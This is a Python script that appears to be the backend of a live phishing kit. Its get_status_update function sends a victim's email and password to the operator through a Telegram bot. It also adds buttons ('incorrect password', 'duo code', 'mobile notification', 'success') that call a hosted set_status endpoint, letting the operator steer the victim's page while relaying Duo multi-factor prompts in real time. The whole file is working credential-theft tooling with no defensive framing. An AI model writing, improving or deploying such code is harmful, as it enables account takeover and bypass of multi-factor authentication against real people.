import requests
import json 
from dotenv import load_dotenv
import os
from urllib.parse import quote # <-- Import the 'quote' function

load_dotenv()

BOT_TOKEN = os.environ.get('BOT_TOKEN')
USER_ID = os.environ.get('USER_ID')
HOSTED_URL = os.environ.get('HOSTED_URL')

# Your send_notification function can remain the same
def send_notification(text):
    
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    chat_id = USER_ID

    payload = {
        'chat_id': chat_id,
        'text': text
    }
    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status() 
        print(f"Message sent successfully to (ID: {chat_id}). Response: {response.json()}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to (ID: {chat_id}): {e}")
    except json.JSONDecodeError:
        print(f"Error sending message to (ID: {chat_id}). Non-JSON response: {response.text}")



def get_status_update(email, password):
    
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    chat_id = USER_ID
    text = f"Email: {email}\nPassword: {password}"

    payload = {
        'chat_id': chat_id,
        'text': text,
    }

    statuses = [
        'incorrect password',
        'mobile notification',
        'duo code',
        'phone_call',
        'incorrect duo code',
        'success'
    ]
    
   
    keyboard_layout = [
        [ # Start a new row for each button
            {
                'text': status,
                'url': f"{HOSTED_URL}/set_status/{email}/{quote(status)}"
            }
        ] # End the row
        for status in statuses
    ]

    inline_keyboard = {
        'inline_keyboard': keyboard_layout
    }
    
    payload['reply_markup'] = json.dumps(inline_keyboard)

    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status() 
        print(f"Message sent successfully to (ID: {chat_id}). Response: {response.json()}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to (ID: {chat_id}): {e}")
        if e.response is not None:
            print(f"Response content: {e.response.text}")
    except json.JSONDecodeError:
        print(f"Error sending message to (ID: {chat_id}). Non-JSON response: {response.text}")


